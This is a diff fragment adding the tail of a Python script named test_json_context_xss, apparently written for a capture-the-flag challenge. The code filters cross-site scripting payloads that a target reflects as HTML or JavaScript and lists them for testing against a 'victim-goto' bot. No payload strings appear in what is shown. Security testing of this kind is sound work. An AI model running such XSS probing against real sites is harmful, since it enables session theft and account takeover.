+            print(f"Payload: {result['payload']}")
+            print(f"Format: {result['format']}")
+            print(f"Content-Type: {result['content_type']}")
+            print(f"Payload reflected: {'Yes' if result['reflected'] else 'No'}")
+            print(f"URL to try: {result['url']}")
+            print(f"Response snippet: {result['response_snippet']}")
+    
+    # Generate a script to test all promising payloads with victim-goto
+    print("\n\nGenerating test script for promising payloads...")
+    promising_payloads = []
+    
+    for result in results:
+        if result["reflected"] and result["content_type"] in ["text/html;charset=utf-8", "application/javascript;charset=utf-8"]:
+            promising_payloads.append({
+                "payload": result["payload"],
+                "url": result["url"]
+            })
+    
+    print(f"Found {len(promising_payloads)} promising payloads to test with victim-goto:")
+    for i, payload in enumerate(promising_payloads):
+        print(f"{i+1}. {payload['payload']}")
+        print(f"   URL: {payload['url']}")
+    
+    # Return the promising URLs for testing
+    return promising_payloads
+
+promising_payloads = test_json_context_xss()
